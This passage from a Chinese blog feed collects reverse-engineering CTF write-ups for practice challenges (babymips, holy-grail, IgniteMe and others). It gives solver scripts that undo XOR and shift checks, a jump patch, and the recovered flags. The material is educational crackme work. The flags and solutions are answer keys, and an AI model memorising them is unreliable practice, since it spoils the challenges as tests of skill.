<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1600096060907.png" alt="" loading="lazy"></figure>
<h3 id="脚本-2">脚本</h3>
<pre><code>a=[0x12,0x04,0x08,0x14,0x24,0x5C,0x4A,0x3D,0x56,0x0A,0x10,0x67,0x00,0x41,0x00,0x01,0x46,0x5A,0x44,0x42,0x6E,0x0C,0x44,0x72,0x0C,0x0D,0x40,0x3E,0x4B,0x5F,0x02,0x01,0x4C,0x5E,0x5B,0x17,0x6E,0x0C,0x16,0x68,0x5B,0x12]
flag=''
e='this_is_not_flag'
for i in range(42):
    flag+=chr(ord(e[i%16])^a[i])
print (flag)
</code></pre>
<h2 id="apk-逆向2">APK-逆向2</h2>
<h3 id="主函数-3">主函数</h3>
<p><img src="https://7usai.github.io/post-images/1600096069499.png" alt="" loading="lazy"><br>
大致意思是通过31337端口向主机发送flag</p>
<h3 id="python脚本">python脚本</h3>
<pre><code>import http.server

server_address = ('127.0.0.1', 31337)
handler_class = http.server.BaseHTTPRequestHandler
httpd = http.server.HTTPServer(server_address, handler_class)
httpd.serve_forever()
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1600096078531.png" alt="" loading="lazy"></figure>
<h2 id="babymips">babymips</h2>
<p>需要配置JDK环境并且安装Ghidra</p>
<h3 id="主函数-4">主函数</h3>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1600096092065.png" alt="" loading="lazy"></figure>
<p>abStack44为输入的字符，之后进行32次异或：abStack44[i]=abStack44[i]^0x20-char[i]<br>
iVar1处转换后前5位是Q|j{g<img src="https://7usai.github.io/post-images/1600096112265.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600096100128.png" alt="" loading="lazy"></p>
<p>uStack16为偶数时相当于&lt;&lt;2|&gt;&gt;6为奇数时相当于&gt;&gt;2|&lt;&lt;6</p>
<h3 id="脚本-3">脚本</h3>
<pre><code>a=[0x51, 0x7C, 0x6A, 0x7B, 0x67,
  0x52, 0xFD, 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41,
  0x54, 0xA0, 0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0,
  0x16, 0x79, 0x1A, 0x15, 0x5B, 0x75, 0x1F, 0x00]
flag=''
for i in range(5,32):
    if((i&amp;1)!=0):
        a[i]=a[i]&gt;&gt;6|(a[i]&lt;&lt;2)%0x100
    else:
        a[i]=(a[i]&lt;&lt;6)%0x100|a[i]&gt;&gt;2
for i in range(32):
    a[i]=a[i]^32-i
    flag+=chr(a[i])
print(flag)
</code></pre>
<p>注意这里的%0x100需要加上不然失败</p>
<h2 id="reverse-for-the-holy-grail-350">reverse-for-the-holy-grail-350</h2>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1600161580746.png" alt="" loading="lazy"></figure>
<h3 id="主函数-5">主函数</h3>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1600161585732.png" alt="" loading="lazy"></figure>
<h3 id="关键函数stringmod">关键函数stringmod</h3>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600161590750.png" alt="" loading="lazy"></figure>
<h3 id="脚本-4">脚本</h3>
<pre><code>firstchar=[0x41,0x69,0x6E,0x45,0x6F,0x61]
thirdchar=[0x2EF,0x2C4,0x2DC,0x2C7,0x2ED,0x2FC]
masterArray=[0x1D7,0x0C,0x244,0x25E,0x93,0x6C]
flag=[0 for i in range(18)]
t=[]
v7=666
temp=0
for i in range(18):
    t.append(v7)
    v7+=v7%5
    if i % 3==0:
        flag[i]=firstchar[temp]
        temp+=1
temp=0
for i in range(2,18,3):
    flag[i]=thirdchar[temp]^t[i]
    temp+=1
temp=0
for i in range (1,18,3):
    for j in range(32,127):
        if((flag[i-1]^t[i-1])*(j^t[i])%(flag[i+1]^t[i+1]))==masterArray[temp]:
            temp+=1
            flag[i]=j
            break
print('tuctf{'+''.join(map(chr,flag))+'}')
</code></pre>
<p>这里得到的是tuctf{AfricanOrEuro Va ?}不知道为什么<br>
如果有想交流的可以发送邮件<br>
实际flag=tuctf{AfricanOrEuropean?}</p>
<h2 id="serial-150">serial-150</h2>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600240488845.png" alt="" loading="lazy"></figure>
<p>注意按字符顺序打印flag，比如208-&gt;208_1_1....</p>
<h2 id="key">key</h2>
<h3 id="主函数-6">主函数</h3>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1600240503658.png" alt="" loading="lazy"></figure>
<p>关键函数是sub_4021E0，大致意思就是将后两个参数进行异或放入第一个参数，</p>
<p><img src="https://7usai.github.io/post-images/1600240522266.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600240536879.png" alt="" loading="lazy">这里可以看到后两个参数是什么</p>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1600240546193.png" alt="" loading="lazy"></figure>
<p>这里也可以但是注意这里是倒叙存储的</p>
<h3 id="编写脚本">编写脚本</h3>
<pre><code>a='themidathemidathemida'
b='&gt;----++++....&lt;&lt;&lt;&lt;.'
c=''
flag=''
for i in range(len(b)):
    c+=chr((ord(a[i])^ord(b[i]))+22)
for i in c:
    flag+=chr(ord(i)+9)
print(flag)
</code></pre>
<p>得flag=idg_cni~bjbfi|gsxb</p>
<h3 id="gametime">gametime</h3>
<h3 id="思路">思路</h3>
<p>运行一边程序后找错误时的字符串所在函数<br>
<img src="https://7usai.github.io/post-images/1600240563079.png" alt="" loading="lazy"><br>
如上，就是要让sub_401260(xxxxx)!=0</p>
<h3 id="进入sub_401260函数">进入sub_401260函数</h3>
<p><img src="https://7usai.github.io/post-images/1600240572593.png" alt="" loading="lazy"><br>
这里有帮助的是v4存在了eax里，最终return的是eax的值<br>
<img src="https://7usai.github.io/post-images/1600240579914.png" alt="" loading="lazy"><br>
看思维图可知loc_4012AD对eax清零了，于是我们就要修改错误跳转</p>
<h3 id="修改错误跳转">修改错误跳转</h3>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1600240594564.png" alt="" loading="lazy"></figure>
<h3 id="运行得flag">运行得flag</h3>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1600240610853.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界_re_2星题_部分wp]]></title>
        <id>https://7usai.github.io/post/gong-fang-shi-jie-re-bu-fen-wp/</id>
        <link href="https://7usai.github.io/post/gong-fang-shi-jie-re-bu-fen-wp/">
        </link>
        <updated>2020-09-10T14:38:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="攻防世界re部分wp">攻防世界RE部分wp</h1>
<h2 id="re2-cpp-is-awesome">re2-cpp-is-awesome</h2>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1599748738949.png" alt="" loading="lazy"></figure>
<p>64位ELF文件 放入ubuntu中运行结果如下</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1599748743703.png" alt="" loading="lazy"></figure>
<p>放入IDA进入main函数</p>
<p><img src="https://7usai.github.io/post-images/1599748750390.png" alt="" loading="lazy"><br>
如下两个 一个正确一个错误</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1599748769934.png" alt="" loading="lazy"></figure>
<p>通过分析可得</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1599748776529.png" alt="" loading="lazy"></figure>
<p>V12与off_6020A0和dword_6020C0组成的数组比较，相同则得flag</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1599748784955.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1599748790751.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1599748796928.png" alt="" loading="lazy"></figure>
<p>得到所需数值后编写函数</p>
<pre><code>a=[0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2d,0x01,0x03,0x00,0x0d,0x56,0x01,0x03,0x65,0x03,0x2d,0x16,0x02,0x15,0x03,0x65,0x00,0x29,0x44,0x44,0x01,0x44,0x2b]
flag=&quot; &quot;
x=&quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;
b=len(a)
for i in range(b):
    flag+=x[a[i]]
print(flag)
</code></pre>
<pre><code>得flag=ALEXCTF{W3_L0v3_C_W1th_CL45535}
</code></pre>
<h2 id="srm-50">srm-50</h2>
<p>主要部分如下</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1599748819043.png" alt="" loading="lazy"></figure>
<p>if部分成立时得flag,说明flag长度为16位，前四位是CZ9d<br>
<img src="https://7usai.github.io/post-images/1599748824045.png" alt="" loading="lazy"><br>
V13<sub>V24组成其余12位，求出V12[4]</sub>V24即可</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1599748829235.png" alt="" loading="lazy"></figure>
<p>编写代码</p>
<pre><code>a=[67,90,57,100,109,113,52,99,56,103,57,71,55,98,65,88]
flag=&quot; &quot;
for i in range(len(a)):
    flag+=chr(a[i])
print(flag)

</code></pre>
<pre><code>得flag为CZ9dmq4c8g9G7bAX
</code></pre>
<h2 id="guess-the-number">Guess-the-Number</h2>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1599748835634.png" alt="" loading="lazy"></figure>
<p>转为zip解压后得<img src="https://7usai.github.io/post-images/1599748846528.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1599748854085.png" alt="" loading="lazy"></figure>
<p>编写脚本</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1599748864158.png" alt="" loading="lazy"></figure>
<pre><code>import java.math.BigInteger;

class Untitled {
	public static void main(String[] args) {
          String str_one = &quot;4b64ca12ace755516c178f72d05d7061&quot;;
          String str_two = &quot;ecd44646cfe5994ebeb35bf922e25dba&quot;;
		  BigInteger i1 = new BigInteger(str_one, 16);
   		  BigInteger i2 = new BigInteger(str_two, 16);
   		  BigInteger res = i1.xor(i2);
    	  String result = res.toString(16);
          System.out.printf(&quot;%s&quot;,result);
	}
}
得flag=a7b08c546302cc1fd2a4d48bf2bf2ddb
</code></pre>
<h3 id="收获第一次反编译java">收获：第一次反编译java</h3>
<h2 id="666">666</h2>
<p>主函数</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600000477839.png" alt="" loading="lazy"></figure>
<p>主要加密函数</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600000482916.png" alt="" loading="lazy"></figure>
<pre><code>a2=[0x69,0x7A,0x77,0x68,0x72,0x6F,0x7A,0x22,0x22,0x77,0x22,0x76,0x2E,0x4B,0x22,0x2E,0x4E,0x69]
flag=''
for i in range(0,18,3):
    flag += chr(18 ^ a2[i] - 6)
    flag += chr(18 ^ a2[i + 1] + 6)
    flag += chr(18 ^ a2[i+2] ^ 6)
print(flag)
</code></pre>
<p>编写代码，得flag</p>
<p>注：我python一直显示一个错误的flag<img src="https://7usai.github.io/post-images/1600000495622.png" alt="" loading="lazy"></p>
<p>c++代码如下：</p>
<pre><code>#include&lt;stdio.h&gt;
int main()
{
char i;
char target[]=&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;;
for(i=0;i&lt;18;i+=3){
    target[i]=(target[i]^18)-6;
    target[i+1]=(target[i+1]^18)+6;
    target[i+2]=(target[i+2]^18)^6;
}
puts(target);
return 0;
}
</code></pre>
<h2 id="2020913第一面完成">2020.9.13第一面完成</h2>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1600000504111.png" alt="" loading="lazy"></figure>
<h2 id="reverseme-120">ReverseMe-120</h2>
<h3 id="main函数">main函数</h3>
<p><img src="https://7usai.github.io/post-images/1600010757978.png" alt="" loading="lazy"><br>
大概思路是需要v9=0；v9=0的前提是v13=you_know_how_to_remove_junk_code；v13是经过异或的得到的，写脚本得之前的v13如下</p>
<pre><code>a='you_know_how_to_remove_junk_code'
b=''
c=len(a)
for i in range(c):
    b+=chr(ord(a[i])^37)
    print(b)
</code></pre>
<p>得到字符串\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@这里失去头绪</p>
<p>sub_401000函数没看懂；但是查看字符串发现<img src="https://7usai.github.io/post-images/1600010779978.png" alt="" loading="lazy"><br>
猜测是base64;</p>
<p>在线加密后得XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=，即为flag</p>
<h2 id="reversing-x64elf-100">Reversing-x64Elf-100</h2>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1600010785917.png" alt="" loading="lazy"></figure>
<h3 id="主函数">主函数</h3>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1600010790350.png" alt="" loading="lazy"></figure>
<h3 id="关键函数">关键函数</h3>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1600010796725.png" alt="" loading="lazy"></figure>
<h3 id="思路">思路</h3>
<p>flag存在a1数组里，逆向进行if里得运算就行<br>
编写脚本</p>
<pre><code>v3 = [&quot;Dufhbmf&quot;,&quot;pG`imos&quot;,&quot;ewUglpt&quot;]
flag=''
for i in range(12):
    flag+=chr(ord(v3[(i % 3)][2 * int(i / 3)])-1)
    print(flag)
</code></pre>
<pre><code>v3[a][b]的意思
a表示下标为a的字符串，b表示此字符串中下标为b的字符
</code></pre>
<h2 id="igniteme">IgniteMe</h2>
<h3 id="main函数-2">main函数</h3>
<figure data-type="image" tabindex="19"><img src="https://7usai.github.io/post-images/1600010801875.png" alt="" loading="lazy"></figure>
<h3 id="进入4011c0">进入4011C0</h3>
<figure data-type="image" tabindex="20"><img src="https://7usai.github.io/post-images/1600010805986.png" alt="" loading="lazy"></figure>
<p>这里byte_4420B0我简单的用一个a表示<img src="https://7usai.github.io/post-images/1600010832666.png" alt="" loading="lazy"></p>
<h3 id="编写脚本">编写脚本</h3>
<pre><code>v7=&quot;GONDPHyGjPEKruv{{pj]X@rF&quot;
a=[0x0D,0x13 ,0x17 ,0x11 ,0x02 ,0x01 ,0x20 ,0x1D,0x0C ,0x02 ,0x19 ,0x2F ,0x17 ,0x2B ,0x24 ,0x1F,0x1E ,
   0x16 ,0x09 ,0x0F ,0x15 ,0x27 ,0x13 ,0x26 ,0x0A ,0x2F ,0x1E ,0x1A ,0x2D ,0x0C ,0x22 ,0x04]
v5=''
eflag=''
for i in range(len(v7)):
    v5+=chr(ord(v7[i])^a[i])
for i in range(len(v5)):
    eflag+=chr((ord(v5[i])-72)^0x55)
    print(eflag)
</code></pre>
<p>这里注意最后得到的flag值需要大小写转换，因为懒没写代码</p>
<p>在网上找的代码如下</p>
<pre><code>for i in range(len(eflag)):
    if ord(eflag[i]) &gt;= 97 and ord(eflag[i]) &lt;= 122:
        flag += chr(ord(eflag[i]) - 32)
    elif ord(eflag[i]) &gt;= 65 and ord(eflag[i]) &lt;= 90:
        flag += chr(ord(eflag[i]) + 32)
    else:
        flag += eflag[i]
</code></pre>
<p>再与<img src="https://7usai.github.io/post-images/1600010822260.png" alt="" loading="lazy">连接，得flag=EIS{wadx_tdgk_aihc_ihkn_pjlm}</p>
<h2 id="总结">总结</h2>
<p>二星题还是很简单的，部分题目自己觉得没有学习意义就没写wp</p>
]]></content>
    </entry>
</feed>